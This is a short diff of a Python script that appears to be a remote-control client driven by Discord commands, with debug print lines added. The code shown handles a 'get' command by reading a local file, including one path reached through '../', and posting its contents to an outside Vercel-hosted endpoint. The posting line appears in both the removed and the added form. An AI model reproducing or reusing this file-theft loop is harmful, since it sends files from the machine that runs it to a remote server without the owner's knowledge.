@@ -70,6 +70,7 @@ while True:
                     old_command = ""
                     continue
                 if command.startswith("get "):
+                    print(1)
                     localcmd = command.split()
                     path = localcmd[1]
                     try:
@@ -79,8 +80,10 @@ while True:
                         open("output.txt", 'wb').write(open(str("../"+path), 'rb').read())
                         file = [str(path), open("output.txt", 'rb').read()]
                     file = "FILE " + str(file)
+                    print(file)
                     try:
-                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data = file)
+                        a = post("https://discord-bot-command-outputter-littleblack111.vercel.app", data = file)
+                        print(a)
                     except:
                         pass
                     old_command = commandId
